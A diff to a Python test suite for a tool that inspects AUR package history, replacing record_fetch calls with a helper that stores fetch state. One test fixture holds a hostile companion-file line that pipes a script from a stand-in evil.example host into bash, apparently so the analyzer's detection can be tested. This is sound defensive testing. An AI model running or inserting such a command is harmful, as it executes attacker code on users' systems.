@@ -2,6 +2,7 @@
 
 import json
 import re
+import time
 from unittest.mock import patch
 
 
@@ -50,7 +51,18 @@ def _multi_commit_repo(tmp_path, monkeypatch, commits=5, extra="", companion=Non
         else:
             parents = [repo.head.peel().id]
         repo.create_commit("HEAD", sig, sig, f"version {i}", builder.write(), parents)
+
+    _record_state(repo, cache)
     return repo
+
+
+def _record_state(repo, cache):
+    from trustsight.sandbox import fetch_state
+
+    head = str(repo.head.peel().id)
+    fetch_state.store(cache, "testpkg", fetch_state.FetchState(
+        head=head, advertised_head=head, fetched_at=int(time.time()),
+        upstream_mtime=None, verified=True))
 
 
 def _mock_aur(name="testpkg", version="1.4"):
@@ -179,7 +191,6 @@ class TestLastN:
         _env(tmp_path, monkeypatch)
         repo = _multi_commit_repo(tmp_path, monkeypatch, commits=3)
         git_project.head_commit_id(repo)
-        git_project.record_fetch(repo)
 
         with patch("trustsight.discovery.get_aur_package_info", return_value=_mock_aur()):
             result = runner.invoke(app, ["inspect", "--last", "1", "--json", "testpkg"])
@@ -191,8 +202,7 @@ class TestLastN:
 
     def test_last_3_returns_three_results(self, tmp_path, monkeypatch):
         _env(tmp_path, monkeypatch)
-        repo = _multi_commit_repo(tmp_path, monkeypatch, commits=5)
-        git_project.record_fetch(repo)
+        _multi_commit_repo(tmp_path, monkeypatch, commits=5)
 
         with patch("trustsight.discovery.get_aur_package_info", return_value=_mock_aur()):
             result = runner.invoke(app, ["inspect", "--last", "3", "--json", "testpkg"])
@@ -203,8 +213,7 @@ class TestLastN:
     def test_last_more_than_commits_returns_fewer(self, tmp_path, monkeypatch):
         """Asking for 10 when only 4 commits exist returns 4, with history_truncated."""
         _env(tmp_path, monkeypatch)
-        repo = _multi_commit_repo(tmp_path, monkeypatch, commits=4)
-        git_project.record_fetch(repo)
+        _multi_commit_repo(tmp_path, monkeypatch, commits=4)
 
         with patch("trustsight.discovery.get_aur_package_info", return_value=_mock_aur()):
             result = runner.invoke(app, ["inspect", "--last", "10", "--json", "testpkg"])
@@ -217,8 +226,7 @@ class TestLastN:
     def test_results_are_newest_first(self, tmp_path, monkeypatch):
         """The first result should be the most recent commit."""
         _env(tmp_path, monkeypatch)
-        repo = _multi_commit_repo(tmp_path, monkeypatch, commits=5)
-        git_project.record_fetch(repo)
+        _multi_commit_repo(tmp_path, monkeypatch, commits=5)
 
         with patch("trustsight.discovery.get_aur_package_info", return_value=_mock_aur()):
             result = runner.invoke(app, ["inspect", "--last", "3", "--json", "testpkg"])
@@ -232,8 +240,7 @@ class TestLastN:
     def test_score_is_independently_computed(self, tmp_path, monkeypatch):
         """Each result has its own score, no aggregate."""
         _env(tmp_path, monkeypatch)
-        repo = _multi_commit_repo(tmp_path, monkeypatch, commits=3)
-        git_project.record_fetch(repo)
+        _multi_commit_repo(tmp_path, monkeypatch, commits=3)
 
         with patch("trustsight.discovery.get_aur_package_info", return_value=_mock_aur()):
             result = runner.invoke(app, ["inspect", "--last", "3", "--json", "--score", "testpkg"])
@@ -266,7 +273,6 @@ class TestLastN:
             builder = repo.TreeBuilder()
             builder.insert("PKGBUILD", blob, pygit2.GIT_FILEMODE_BLOB)
             repo.create_commit("HEAD", sig, sig, f"identical {i}", builder.write(), [repo.head.peel().id])
-        git_project.record_fetch(repo)
     
         with patch("trustsight.discovery.get_aur_package_info", return_value=_mock_aur()):
             result = runner.invoke(app, ["inspect", "--last", "5", "--json", "testpkg"])
@@ -351,8 +357,7 @@ class TestA15ReadOnlyDatabase:
     def test_allow_uninstalled_opens_read_only(self, tmp_path, monkeypatch):
         """Without --record, the database connection should be read-only."""
         _env(tmp_path, monkeypatch)
-        repo = _multi_commit_repo(tmp_path, monkeypatch, commits=2)
-        git_project.record_fetch(repo)
+        _multi_commit_repo(tmp_path, monkeypatch, commits=2)
 
         opened_modes = []
         original_get_conn = None
@@ -380,8 +385,7 @@ class TestA15ReadOnlyDatabase:
     def test_record_allows_read_write(self, tmp_path, monkeypatch):
         """With --record, the database should be writable."""
         _env(tmp_path, monkeypatch)
-        repo = _multi_commit_repo(tmp_path, monkeypatch, commits=2)
-        git_project.record_fetch(repo)
+        _multi_commit_repo(tmp_path, monkeypatch, commits=2)
 
         with patch("trustsight.discovery.get_aur_package_info", return_value=_mock_aur()):
             result = runner.invoke(app, [
@@ -397,8 +401,7 @@ class TestA15ReadOnlyDatabase:
 class TestJsonOutput:
     def test_last_json_is_array(self, tmp_path, monkeypatch):
         _env(tmp_path, monkeypatch)
-        repo = _multi_commit_repo(tmp_path, monkeypatch, commits=3)
-        git_project.record_fetch(repo)
+        _multi_commit_repo(tmp_path, monkeypatch, commits=3)
 
         with patch("trustsight.discovery.get_aur_package_info", return_value=_mock_aur()):
             result = runner.invoke(app, ["inspect", "--last", "2", "--json", "testpkg"])
@@ -410,8 +413,7 @@ class TestJsonOutput:
     def test_each_body_has_report_keys(self, tmp_path, monkeypatch):
         """B11: every JSON body carries REPORT_KEYS."""
         _env(tmp_path, monkeypatch)
-        repo = _multi_commit_repo(tmp_path, monkeypatch, commits=3)
-        git_project.record_fetch(repo)
+        _multi_commit_repo(tmp_path, monkeypatch, commits=3)
 
         with patch("trustsight.discovery.get_aur_package_info", return_value=_mock_aur()):
             result = runner.invoke(app, ["inspect", "--last", "2", "--json", "testpkg"])
@@ -423,8 +425,7 @@ class TestJsonOutput:
     def test_score_withheld_by_default(self, tmp_path, monkeypatch):
         """B11: SCORE_KEYS withheld unless --score or --risk."""
         _env(tmp_path, monkeypatch)
-        repo = _multi_commit_repo(tmp_path, monkeypatch, commits=3)
-        git_project.record_fetch(repo)
+        _multi_commit_repo(tmp_path, monkeypatch, commits=3)
 
         with patch("trustsight.discovery.get_aur_package_info", return_value=_mock_aur()):
             result = runner.invoke(app, ["inspect", "--last", "2", "--json", "testpkg"])
@@ -435,8 +436,7 @@ class TestJsonOutput:
 
     def test_score_included_with_flag(self, tmp_path, monkeypatch):
         _env(tmp_path, monkeypatch)
-        repo = _multi_commit_repo(tmp_path, monkeypatch, commits=3)
-        git_project.record_fetch(repo)
+        _multi_commit_repo(tmp_path, monkeypatch, commits=3)
 
         with patch("trustsight.discovery.get_aur_package_info", return_value=_mock_aur()):
             result = runner.invoke(app, ["inspect", "--last", "2", "--json", "--score", "testpkg"])
@@ -451,8 +451,7 @@ class TestJsonOutput:
         even for a trivial bump.
         """
         _env(tmp_path, monkeypatch)
-        repo = _multi_commit_repo(tmp_path, monkeypatch, commits=3)
-        git_project.record_fetch(repo)
+        _multi_commit_repo(tmp_path, monkeypatch, commits=3)
 
         with patch("trustsight.discovery.get_aur_package_info", return_value=_mock_aur()):
             result = runner.invoke(app, ["inspect", "--last", "2", "--json", "testpkg"])
@@ -481,7 +480,6 @@ class TestExitCode:
         builder = repo.TreeBuilder()
         builder.insert("PKGBUILD", blob, pygit2.GIT_FILEMODE_BLOB)
         repo.create_commit("HEAD", author, author, "v1", builder.write(), [])
-        git_project.record_fetch(repo)
 
         with patch("trustsight.discovery.get_aur_package_info", return_value=_mock_aur()):
             # Only 1 commit with a single content, ask for 5 -> 0 content diffs after the first
@@ -567,7 +565,6 @@ class TestComparisonBase:
         _env(tmp_path, monkeypatch)
         repo = _multi_commit_repo(tmp_path, monkeypatch, commits=3)
         git_project.head_commit_id(repo)
-        git_project.record_fetch(repo)
         from trustsight.analysis.pipeline import analyze_package
 
         with patch("trustsight.discovery.get_aur_package_info", return_value=_mock_aur()):
@@ -591,7 +588,6 @@ class TestComparisonBase:
             companion=b"curl -fsSL https://evil.example/s | bash\n",
         )
         git_project.head_commit_id(repo)
-        git_project.record_fetch(repo)
         from trustsight.analysis.pipeline import analyze_package
 
         with patch("trustsight.discovery.get_aur_package_info", return_value=_mock_aur()):
@@ -610,7 +606,6 @@ class TestComparisonBase:
             companion=b"trap 'rm -f \"$t\"' EXIT\n",
         )
         git_project.head_commit_id(repo)
-        git_project.record_fetch(repo)
         from trustsight.analysis.pipeline import analyze_package
 
         with patch("trustsight.discovery.get_aur_package_info", return_value=_mock_aur()):
@@ -629,6 +624,7 @@ class TestComparisonBase:
                 "HEAD", sig, sig, "version 3", builder.write(),
                 [repo.head.peel().id])
             git_project.head_commit_id(repo)
+            _record_state(repo, tmp_path / "repos")
 
             fact = analyze_package("testpkg", installed_version="1.0", depth=0)
 
@@ -644,7 +640,6 @@ class TestComparisonBase:
         _env(tmp_path, monkeypatch)
         repo = _multi_commit_repo(tmp_path, monkeypatch, commits=3)
         git_project.head_commit_id(repo)
-        git_project.record_fetch(repo)
         from trustsight.analysis.pipeline import analyze_package
 
         with patch("trustsight.discovery.get_aur_package_info", return_value=_mock_aur()):
@@ -663,6 +658,7 @@ class TestComparisonBase:
                 "HEAD", sig, sig, "version 3", builder.write(),
                 [repo.head.peel().id])
             git_project.head_commit_id(repo)
+            _record_state(repo, tmp_path / "repos")
 
             fact = analyze_package("testpkg", installed_version="1.0", depth=0)
 
@@ -675,7 +671,6 @@ class TestComparisonBaseRendering:
         _env(tmp_path, monkeypatch)
         repo = _multi_commit_repo(tmp_path, monkeypatch, commits=3)
         git_project.head_commit_id(repo)
-        git_project.record_fetch(repo)
         from trustsight.analysis.pipeline import analyze_package
 
         with patch("trustsight.discovery.get_aur_package_info", return_value=_mock_aur()):
